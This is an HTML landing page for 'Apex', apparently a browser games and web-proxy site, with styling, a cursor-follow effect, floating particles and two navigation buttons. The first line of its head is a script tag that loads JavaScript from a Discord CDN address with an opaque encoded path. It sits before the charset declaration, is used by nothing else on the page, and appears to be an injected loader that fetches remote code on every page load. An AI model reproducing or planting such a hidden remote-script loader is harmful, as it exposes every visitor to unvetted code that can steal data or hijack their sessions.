<!DOCTYPE html>
<html lang="en">
<head>
  <script type='text/javascript' src='https://cdn.discordapp.com/F-JFdZeUqHIpH4-_NrV6dZD1OoY1TKi41IzbYwwRKKAZXxsojCmPiDcI4HvPemMnnfjM75sVHYMiw8ytEuHg4g=='></script>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Apex</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    html, body {
      width: 100%;
      height: 100%;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: radial-gradient(ellipse at center, #0b0c1a 10%, #000000 100%);
      color: white;
      overflow: hidden;
    }
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }
    .container {
      text-align: center;
      animation: fadeIn 2s ease forwards;
      opacity: 0;
      position: relative;
      z-index: 2;
    }
    @keyframes fadeIn {
      to { opacity: 1; }
    }
    .logo, .slogan {
      position: relative;
      display: inline-block;
      transition: transform 0.3s ease;
    }
    .logo {
      font-size: 4.5rem;
      font-weight: bold;
      letter-spacing: 0.1em;
      text-shadow: 0 0 10px #a259ff, 0 0 20px #a259ff;
    }
    .slogan {
      font-size: 1.5rem;
      margin-top: 0.5rem;
      opacity: 0.7;
      font-style: italic;
      display: block;
    }
    .buttons {
      margin-top: 3rem;
      display: flex;
      justify-content: center;
      gap: 2rem;
    }
    .btn {
      padding: 1rem 2rem;
      background: rgba(255, 255, 255, 0.05);
      border: 2px solid #a259ff;
      color: white;
      font-size: 1.2rem;
      border-radius: 2rem;
      cursor: pointer;
      transition: all 0.3s ease;
      backdrop-filter: blur(6px);
    }
    .btn:hover {
      background: #a259ff;
      color: #000;
      transform: scale(1.1);
      box-shadow: 0 0 15px #a259ff;
    }
    .cursor-follow {
      position: absolute;
      width: 200vw;
      height: 200vh;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      pointer-events: none;
      background: radial-gradient(circle at center, rgba(162, 89, 255, 0.05), transparent 60%);
      transition: transform 0.1s ease;
      z-index: 1;
    }
    #particles {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      overflow: hidden;
    }
    .particle {
      position: absolute;
      width: 2px;
      height: 2px;
      background: rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      animation: float linear infinite;
    }
    @keyframes float {
      0% {
        transform: translateY(100vh);
        opacity: 0;
      }
      100% {
        transform: translateY(-10vh);
        opacity: 1;
      }
    }
  </style>
</head>
<body>
  <div id="particles"></div>
  <div class="cursor-follow" id="cursorEffect"></div>
  <div class="container">
    <div class="logo" id="logo">apex</div>
    <div class="slogan" id="slogan">Reach the top of play</div>
    <div class="buttons">
      <div class="btn" onclick="window.location.href='games.html'">Games</div>
      <div class="btn" onclick="window.location.href='/public/index.html'">Proxy</div>
    </div>
  </div>
  <script>
    const cursorEffect = document.getElementById("cursorEffect");
    const logo = document.getElementById("logo");
    const slogan = document.getElementById("slogan");

    document.addEventListener("mousemove", (e) => {
      const x = e.clientX;
      const y = e.clientY;

      const centerX = window.innerWidth / 2;
      const centerY = window.innerHeight / 2;

      const deltaX = (x - centerX) / 100;
      const deltaY = (y - centerY) / 100;

      logo.style.transform = `translate(${deltaX}px, ${deltaY}px)`;
      slogan.style.transform = `translate(${deltaX / 2}px, ${deltaY / 2}px)`;

      cursorEffect.style.transform = `translate(${x - window.innerWidth}px, ${y - window.innerHeight}px)`;
    });

    const particlesContainer = document.getElementById("particles");
    for (let i = 0; i < 100; i++) {
      const particle = document.createElement("div");
      particle.classList.add("particle");
      const left = Math.random() * 100;
      const duration = 10 + Math.random() * 20;
      const delay = Math.random() * -20;
      particle.style.left = `${left}vw`;
      particle.style.animationDuration = `${duration}s`;
      particle.style.animationDelay = `${delay}s`;
      particlesContainer.appendChild(particle);
    }
  </script>
</body>
</html>
